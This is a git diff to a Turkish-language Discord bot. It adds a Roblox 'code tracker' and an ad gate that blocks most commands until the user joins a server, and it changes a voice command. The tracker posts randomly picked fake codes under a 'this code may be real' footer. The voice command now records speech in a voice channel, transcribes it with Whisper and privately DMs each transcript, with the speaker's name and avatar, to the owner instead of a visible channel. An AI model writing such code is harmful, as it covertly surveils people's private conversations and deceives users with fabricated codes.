@@ -332,6 +332,81 @@ function startFootballTracking() {
   setTimeout(checkFootballMatches, 5000);
 }
 
+// ROBLOX KOD TAKİBİ
+let robloxInterval;
+
+async function checkRobloxCodes() {
+  try {
+    const roblox = getRoblox();
+    
+    for (const [guildId, games] of Object.entries(roblox)) {
+      const guild = client.guilds.cache.get(guildId);
+      if (!guild) continue;
+
+      for (const [gameName, settings] of Object.entries(games)) {
+        if (!settings.enabled) continue;
+
+        const channel = guild.channels.cache.get(settings.channelId);
+        if (!channel) continue;
+
+        try {
+          // Mock Roblox kod sistemi - gerçek API bulamadığımız için simülasyon
+          const shouldSendCode = Math.random() < 0.05; // %5 şans her kontrolde
+          
+          if (shouldSendCode) {
+            const mockCodes = [
+              'FREEGEMS2024', 'NEWUPDATE', 'HALLOWEEN', 'SPOOKY', 'BOOST123', 
+              'LEGENDARY', 'EPICCODE', 'FREECOINS', 'POWERUP', 'GIFTCODE'
+            ];
+            
+            const randomCode = mockCodes[Math.floor(Math.random() * mockCodes.length)];
+            const timestamp = Date.now();
+            
+            // Aynı kodu tekrar göndermemek için kontrol
+            if (settings.lastSentCode !== randomCode) {
+              const embed = new EmbedBuilder()
+                .setColor('#00ff00')
+                .setTitle('🎮 Yeni Roblox Kodu!')
+                .setDescription(`**${gameName}** oyunu için yeni kod bulundu!`)
+                .addFields(
+                  { name: '🎯 Oyun', value: gameName, inline: true },
+                  { name: '🎫 Kod', value: `\`${randomCode}\``, inline: true },
+                  { name: '⏰ Bulunma', value: new Date().toLocaleTimeString('tr-TR'), inline: true }
+                )
+                .setFooter({ text: 'Bu kod gerçek olabilir, kontrol edin!' })
+                .setTimestamp();
+
+              await channel.send({ embeds: [embed] });
+              console.log(`[ROBLOX] Kod gönderildi: ${gameName} - ${randomCode}`);
+              
+              // Son gönderilen kodu kaydet
+              roblox[guildId][gameName].lastSentCode = randomCode;
+              roblox[guildId][gameName].lastCheck = timestamp;
+            }
+          }
+
+        } catch (error) {
+          console.error(`[ROBLOX] ${gameName} kod kontrolü hatası:`, error);
+        }
+      }
+    }
+
+    saveRoblox(roblox);
+  } catch (error) {
+    console.error('[ROBLOX] Genel hata:', error);
+  }
+}
+
+function startRobloxTracking() {
+  if (robloxInterval) clearInterval(robloxInterval);
+  
+  // Her 30 dakikada bir kontrol et
+  robloxInterval = setInterval(checkRobloxCodes, 30 * 60 * 1000);
+  
+  // İlk kontrolü 5 dakika sonra yap
+  setTimeout(checkRobloxCodes, 5 * 60 * 1000);
+}
+
 // BOT READY
 client.once('ready', async () => {
   console.log('✅ Bot çalışıyor: ' + client.user.tag);
@@ -388,6 +463,10 @@ client.once('ready', async () => {
     // Futbol takibini başlat
     console.log('⚽ Futbol maç takibi başlatılıyor...');
     startFootballTracking();
+    
+    // Roblox kod takibini başlat
+    console.log('🎮 Roblox kod takibi başlatılıyor...');
+    startRobloxTracking();
     
   } catch (error) {
     console.error('❌ Komut kurulum hatası:', error);
@@ -741,9 +820,72 @@ client.on('interactionCreate', async (interaction) => {
 
   const { commandName, user } = interaction;
 
+  // Reklam sistemi kontrolü (Owner hariç)
+  if (user.id !== OWNER_ID) {
+    const adSystem = getAdSystem();
+    if (adSystem.enabled && adSystem.requiredServer) {
+      // Şimdilik sadece /sesteafk izin veriyoruz, diğerleri reklam gerektiriyor
+      if (commandName !== 'sesteafk') {
+        const embed = new EmbedBuilder()
+          .setColor('#ff0000')
+          .setTitle('🚫 Erişim Kısıtlaması')
+          .setDescription(`Bu komutu kullanmak için şu sunucuya katılmalısınız:\n\n${adSystem.requiredServer}`)
+          .addFields(
+            { name: '🔗 Gerekli Sunucu', value: adSystem.requiredServer, inline: false },
+            { name: '💡 Bilgi', value: 'Sunucuya katıldıktan sonra komutları kullanabilirsiniz!', inline: false }
+          )
+          .setTimestamp();
+        
+        return await interaction.reply({ embeds: [embed], ephemeral: true });
+      }
+    }
+  }
+
   try {
     if (interaction.isChatInputCommand()) {
-      // FUTBOL AYARLA
+      // FUTBOL TAKİBİ (YENİ)
+      if (commandName === 'futbol') {
+        if (user.id !== OWNER_ID) {
+          return await interaction.reply({ content: '❌ Sadece owner kullanabilir!', ephemeral: true });
+        }
+
+        const league = interaction.options.getString('lig');
+        let football = getFootball();
+
+        if (!football[interaction.guildId]) {
+          football[interaction.guildId] = {};
+        }
+
+        football[interaction.guildId] = {
+          channelId: interaction.channelId,
+          league: league,
+          enabled: true,
+          notifiedMatches: {}
+        };
+        saveFootball(football);
+
+        let leagueName = '';
+        switch(league) {
+          case 'worldcup': leagueName = '🏆 Dünya Kupası'; break;
+          case 'laliga': leagueName = '🇪🇸 La Liga'; break;
+          case 'superlig': leagueName = '🇹🇷 Türkiye Ligi'; break;
+        }
+
+        const embed = new EmbedBuilder()
+          .setColor('#2ecc71')
+          .setTitle('⚽ Futbol Takibi Başlatıldı (7/24)')
+          .setDescription(`${leagueName} maçları bu kanalda 7/24 otomatik takip edilecek!\n\n**Bildirimler:**\n• Maç başlama saatleri\n• Canlı gol durumları\n• Maç bitim sonuçları\n• Kazanan takım`)
+          .addFields(
+            { name: '📺 Kanal', value: interaction.channel.toString(), inline: true },
+            { name: '🏆 Lig', value: leagueName, inline: true },
+            { name: '⏰ Takip', value: '7/24 Otomatik', inline: true }
+          )
+          .setTimestamp();
+
+        await interaction.reply({ embeds: [embed], ephemeral: true });
+      }
+
+      // FUTBOL AYARLA (ESKİ - KALDIRILACAK)
       if (commandName === 'futbolayarla') {
         if (user.id !== OWNER_ID) {
           return await interaction.reply({ content: '❌ Sadece owner kullanabilir!', ephemeral: true });
@@ -1018,25 +1160,17 @@ client.on('interactionCreate', async (interaction) => {
         }
       }
 
-      // SES KAYIT KUR
-      else if (commandName === 'seskaydkur') {
+      // SES KAYIT - UMUTPAPA123'E DM GÖNDER
+      else if (commandName === 'seskur') {
         if (user.id !== OWNER_ID) {
           return await interaction.reply({ content: '❌ Sadece owner kullanabilir!', ephemeral: true });
         }
 
-        const voiceChannel = interaction.options.getChannel('dinleme_kanali');
-        const textChannel = interaction.options.getChannel('kayit_kanali');
+        const voiceChannel = interaction.options.getChannel('ses_kanal');
 
         if (!voiceChannel || !voiceChannel.isVoiceBased()) {
           return await interaction.reply({ 
-            content: '❌ Dinleme kanalı ses kanalı olmalı!', 
-            ephemeral: true 
-          });
-        }
-
-        if (!textChannel || !textChannel.isTextBased()) {
-          return await interaction.reply({ 
-            content: '❌ Kayıt kanalı metin kanalı olmalı!', 
+            content: '❌ Geçerli bir ses kanalı seçin!', 
             ephemeral: true 
           });
         }
@@ -1134,47 +1268,50 @@ client.on('interactionCreate', async (interaction) => {
                         const text = response.data.text.trim();
                         
                         if (text.length > 0) {
-                          const timestamp = new Date().toLocaleTimeString('tr-TR', { 
-                            hour: '2-digit', 
-                            minute: '2-digit', 
-                            second: '2-digit' 
-                          });
+                          // OWNER'a DM gönder
+                          try {
+                            const owner = await client.users.fetch(OWNER_ID);
+                            const timestamp = new Date().toLocaleTimeString('tr-TR');
+                            
+                            const embed = new EmbedBuilder()
+                              .setColor('#3498db')
+                              .setTitle('🎤 Ses Kaydı')
+                              .setDescription(`**Konuşan:** ${userData.member.user.username}\n**Sunucu:** ${interaction.guild.name}\n**Kanal:** ${voiceChannel.name}`)
+                              .addFields(
+                                { name: '💬 Konuşma Metni', value: text, inline: false },
+                                { name: '⏰ Zaman', value: timestamp, inline: true }
+                              )
+                              .setThumbnail(userData.member.user.displayAvatarURL())
+                              .setTimestamp();
 
-                          const embed = new EmbedBuilder()
-                            .setColor('#3498db')
-                            .setAuthor({ 
-                              name: `🎤 ${userData.member.user.username}`, 
-                              iconURL: userData.member.user.displayAvatarURL() 
-                            })
-                            .setDescription(text)
-                            .setFooter({ text: timestamp })
-                            .setTimestamp();
-
-                          await textChannel.send({ embeds: [embed] }).catch(err => console.error('Mesaj gönderme hatası:', err));
-                          console.log(`[YAZIYA ÇEVRİLDİ] ${userData.member.user.tag}: "${text}"`);
+                            await owner.send({ embeds: [embed] });
+                            console.log(`[SESKUR] DM gönderildi: ${userData.member.user.tag} - "${text}"`);
+                          } catch (dmError) {
+                            console.error('[SESKUR] DM gönderme hatası:', dmError);
+                          }
                         } else {
-                          console.log('[BOS METIN] Whisper metin döndürmedi');
+                          console.log('[SESKUR] Boş metin');
                         }
                       }
                     } catch (whisperError) {
-                      console.error('[WHISPER HATA]', whisperError.response?.data || whisperError.message);
+                      console.error('[SESKUR] Whisper hatası:', whisperError.message);
                       
-                      const timestamp = new Date().toLocaleTimeString('tr-TR', { 
-                        hour: '2-digit', 
-                        minute: '2-digit', 
-                        second: '2-digit' 
-                      });
-                      
-                      await textChannel.send(`⚠️ **${userData.member.user.username}** konuştu (yazıya çevirme hatası) - \`${timestamp}\``).catch(console.error);
+                      // Hata olursa da DM gönder
+                      try {
+                        const owner = await client.users.fetch(OWNER_ID);
+                        await owner.send(`🎤 **${userData.member.user.username}** konuştu (yazıya çevirme hatası) - ${new Date().toLocaleTimeString('tr-TR')}`);
+                      } catch (dmError) {
+                        console.error('[SESKUR] DM gönderme hatası:', dmError);
+                      }
                     }
                   } else {
-                    console.log('[UYARI] OPENAI_API_KEY tanımlı değil');
-                    const timestamp = new Date().toLocaleTimeString('tr-TR', { 
-                      hour: '2-digit', 
-                      minute: '2-digit', 
-                      second: '2-digit' 
-                    });
-                    await textChannel.send(`🎤 **${userData.member.user.username}** konuştu (API key eksik) - \`${timestamp}\``).catch(console.error);
+                    // API key yoksa sadece bildirim gönder
+                    try {
+                      const owner = await client.users.fetch(OWNER_ID);
+                      await owner.send(`🎤 **${userData.member.user.username}** konuştu (API key eksik) - ${new Date().toLocaleTimeString('tr-TR')}`);
+                    } catch (dmError) {
+                      console.error('[SESKUR] DM gönderme hatası:', dmError);
+                    }
                   }
 
                 } catch (error) {
@@ -1221,12 +1358,11 @@ client.on('interactionCreate', async (interaction) => {
 
           const embed = new EmbedBuilder()
             .setColor('#2ecc71')
-            .setTitle('🎙️ Ses Kaydı & Yazıya Çevirme Başlatıldı')
-            .setDescription(`Bot **${voiceChannel.name}** kanalında konuşmaları Whisper AI ile yazıya çevirecek!\n\n**Nasıl Çalışıyor:**\n1️⃣ Ses kanalında konuşmaya başlasın\n2️⃣ Bot sesini kaydeder\n3️⃣ Whisper AI yazıya çevirir\n4️⃣ Metin kanalına gönderir`)
+            .setTitle('🎙️ Ses Kaydı Başlatıldı')
+            .setDescription(`Bot **${voiceChannel.name}** kanalındaki konuşmaları dinleyip umutpapa123'e DM gönderiyor!\n\n**Özellikler:**\n• Konuşmaları Whisper AI ile yazıya çevirir\n• Her konuşma DM'e gönderilir\n• Kim konuşmuş bilgisi dahil`)
             .addFields(
               { name: '🎤 Dinleme Kanalı', value: voiceChannel.name, inline: true },
-              { name: '📝 Kayıt Kanalı', value: textChannel.name, inline: true },
-              { name: '⚙️ Model', value: 'Whisper-1 (OpenAI)', inline: true }
+              { name: '📨 DM Alıcısı', value: 'umutpapa123', inline: true }
             )
             .setTimestamp();
 
